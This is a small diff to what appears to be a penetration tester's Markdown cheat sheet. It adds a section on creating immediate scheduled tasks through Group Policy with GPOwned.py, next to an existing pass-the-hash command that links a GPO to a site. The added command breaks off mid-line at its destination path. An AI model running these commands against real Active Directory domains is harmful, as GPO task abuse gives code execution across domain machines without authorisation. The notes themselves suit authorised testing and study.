@@ -41,3 +41,8 @@ GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcma
 ```
 GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -linkgpotosite -name "<gpo_name|jubeaz>" -sitename "<site_name|Default-First-Site-Name>"
 ```
+
+## immediate tasks
+```bash
+python3 GPOwned.py -u <user>  -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -gpoimmtask -name '{<gpo_guid>}' -author '<gpo_name|jubeaz>' -taskname '<task_name|jubeaz>C' -taskdescription '<gpo_desc|jubeaz>' -dstpath 'c:\windows\system32
+```
